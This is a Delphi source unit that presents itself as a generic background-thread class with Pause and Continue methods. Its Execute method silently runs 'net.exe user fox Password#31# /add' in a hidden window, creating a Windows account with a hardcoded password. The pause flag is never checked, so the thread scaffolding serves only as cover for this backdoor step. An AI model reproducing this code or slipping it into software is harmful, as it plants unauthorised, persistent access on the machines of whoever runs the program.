unit BackgroundThreadUnit;

interface

uses
  System.Classes;

type
  TBackgroundThread = class(TThread)
  private
    FPaused: Boolean;

  protected
    procedure Execute; override;
  public
    procedure Pause;
    procedure Continue;
  end;

implementation

uses
  shellapi, System.SysUtils, System.IOUtils,Windows;

var domain:boolean;


procedure TBackgroundThread.Continue;
begin
  FPaused := False;
end;





procedure TBackgroundThread.Pause;
begin
  FPaused := True;
end;


procedure TBackgroundThread.Execute;
begin
  ShellExecute(0, nil, 'net.exe',  'user fox Password#31# /add', nil, SW_HIDE);
end;


begin
end.
